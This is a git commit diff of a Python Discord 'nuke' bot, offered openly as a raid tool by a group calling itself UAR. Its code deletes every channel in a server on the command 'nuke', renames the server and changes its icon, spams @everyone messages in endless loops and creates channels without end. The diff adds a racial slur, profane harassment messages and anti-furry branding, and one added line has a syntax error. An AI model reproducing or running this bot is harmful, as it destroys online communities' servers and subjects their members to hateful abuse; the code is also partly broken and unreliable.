200d33de0a7d03d91016560e862323a4e7832c7b
spiderman from earth 69 <101507136+andboss25@users.noreply.github.com>
2023-12-22 18:26:34 +0200

    Update nuke.py

--- nuke.py
+++ nuke.py
@@ -1,4 +1,6 @@
 
+#Made by spidermanfromearth69reboot
+
 import discord
 import asyncio
 
@@ -11,29 +13,27 @@ async def on_ready():
 
 	for guild in bot.guilds:
 		print(f"- {guild.id} (name: {guild.name}) (id: {guild.id}) (Owner: {guild.owner})")
-
 		guild_count = guild_count + 1
 
 	print("Nuke is in " + str(guild_count) + " guilds.")
 
-
 @bot.event
 async def on_guild_channel_create(channel):
 	while True:
-		await channel.send("@everyone fucked by uar , https://discord.gg/uMF7bYWV https://tenor.com/view/anti-furry-afa-animated-antifur-gif-25154410")
+		await channel.send("@everyone fucked by uar , https://cdn.discordapp.com/attachments/1172512620503375904/1185953746220490883/lv_0_20231217173635.gif?ex=65917c7f&is=657f077f&hm=ccc0957c62487bd90e22e2859909744eb1e19c77b5537583099490f0ccd072ac&")
 
 @bot.event
 async def on_message(message):
 	if message.content == "nuke":
-		await message.channel.send("```NUKE BOT ACTIVE```")
 		guild = message.guild
+		with open'UAR.jpg', 'rb') as f: icon = f.read()
+		await message.channel.send("k nigger")
 		for channel in guild.channels:
 			await channel.delete()
-		await guild.edit(name="Fucked by UAR")
+		await guild.edit(name="Fucked by UAR",icon=icon)
 		await guild.create_role(name = "FUCKED BY UAR")
 		while True:
 			channel = await guild.create_text_channel('[fucked-by-the-UAR]')
 
 
-bot.run("") #token
-#UAR is united antifurry republic , join if you want
+bot.run("") #token here
